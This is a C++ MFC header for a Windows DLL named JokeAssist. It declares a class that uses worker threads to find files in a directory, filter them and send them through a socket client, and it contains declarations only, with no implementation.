// JokeAssist.h : main header file for the JokeAssist DLL
//

#pragma once

#ifndef __AFXWIN_H__
	#error "include 'stdafx.h' before including this file for PCH"
#endif

#include "resource.h"		// main symbols
#include "stdafx.h"
#include <mmsystem.h>
#include "FileHeader.h"
#include "JokeLib.h"
#include "AutoLock.h"
#include "CriticalSectionAgent.h"
// CJokeAssistApp
// See JokeAssist.cpp for the implementation of this class
//

class CJokeAssistApp : public CWinApp
{
public:
	CJokeAssistApp();

// Overrides
public:
	virtual BOOL InitInstance();
public:
	HANDLE hEventFinished = nullptr;
	HANDLE hEventStop = nullptr;
	MMRESULT	m_hTimer;
	CCriticalSectionAgent m_csSendFiles;
	UINT	m_nSendFiles = 0;
	UINT	m_nFoundFiles = 0;
	UINT	m_nFiltedFiles = 0;
	HINSTANCE	m_hModule = nullptr;
	volatile bool m_bSendThreadRun = false;
	
	CCriticalSection m_csList;
	list<FileInfoPtr> m_FileList;
	CWinThread *m_pThread = nullptr;
	void PushFile(CString strPath, CString strFile)
	{
		m_csList.Lock();
		m_FileList.push_back(make_shared<FileInfo>(strPath, strFile));
		m_csList.Unlock();
	}
	static UINT __stdcall ThreadFindFiles(void *p)
	{
		CJokeAssistApp *pThis = (CJokeAssistApp *)p;
		return pThis->FindFiles();
	}
	static UINT __stdcall ThreadSendFiles(void *p)
	{
		CJokeAssistApp *pThis = (CJokeAssistApp *)p;
		return  pThis->SendThread();
	}
	//static void AccessFile(CString strFile, void *pParam);
	// 匹配成功时返回true
	bool CheckFilter(CString strFile, bool bExt = true);
	HANDLE m_hJokeRun = nullptr;
	CString m_strFilter;
	CString m_strDirectory;
	int m_nDirLength;
	ULONGLONG m_nTotalFileSize = 0;
	UINT FindFiles();
	UINT SendThread();
	CCriticalSectionAgent m_csFileListtoSend;
	list<FileInfoPtr> m_FileListtoSend;
	
	//shared_ptr<CSockClient> pClient = make_shared<CSockClient>();
	void AccessDirectory(CString szDirectory);
	bool SendFile(CString strFilePath, CString strFile, CSockClientPtr &pClient,byte *pBuffer,int nBufferSize);

	DECLARE_MESSAGE_MAP()
	virtual int ExitInstance();
};
//bool DetectCharset(char *pBuffer, int nBufferSize, char *szCharset, int nCharsetSize);
extern CJokeAssistApp theApp;
